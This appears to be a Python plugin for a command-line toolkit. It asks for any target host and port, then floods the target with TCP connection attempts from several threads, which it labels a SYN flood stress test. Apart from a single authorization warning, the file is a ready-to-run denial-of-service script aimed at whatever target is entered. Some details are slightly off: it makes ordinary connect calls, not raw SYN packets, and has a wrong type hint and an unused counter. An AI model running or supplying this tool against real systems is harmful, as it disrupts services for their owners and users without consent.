import socket
import random
import threading
import color

DESCRIPTION = "TCP SYN Flood Stress Testing Tool"
GROUP_ID = 1  # Networking Tools
COLOR = color.BLUE

def send_syn_packet(target_ip: int, target_port: int, packet_count: int):
    """Send raw TCP SYN packets or connection floods."""
    sent = 0
    for _ in range(packet_count):
        try:
            # Using standard TCP socket connection attempt to simulate SYN flood behavior
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect_ex((target_ip, target_port))
            s.close()
            sent += 1
        except Exception:
            pass

def run():
    print(color.color_text("--- TCP SYN Flood Stress Tool ---", COLOR))
    print(color.color_text("[!] Warning: Use only for authorized stress testing and educational purposes.\n", color.RED))
    
    target = input("Enter target IP address or domain: ").strip()
    if not target:
        print(color.color_text("[!] Target cannot be empty.", color.RED))
        return

    try:
        target_ip = socket.gethostbyname(target)
    except Exception as e:
        print(color.color_text(f"[!] Could not resolve target: {e}", color.RED))
        return

    try:
        target_port = int(input("Enter target port (e.g., 80): ").strip() or "80")
        count = int(input("Enter requests per thread (e.g., 200): ").strip() or "200")
        threads_num = int(input("Enter number of concurrent threads (e.g., 5): ").strip() or "5")
    except ValueError:
        print(color.color_text("[!] Invalid numeric input provided.", color.RED))
        return

    print(color.color_text(f"\n[+] Starting TCP connection flood against {target_ip}:{target_port} using {threads_num} threads...\n", color.GREEN))

    threads = []
    for _ in range(threads_num):
        t = threading.Thread(target=send_syn_packet, args=(target_ip, target_port, count))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print(color.color_text(f"\n[+] TCP stress testing session finished.", color.CYAN))
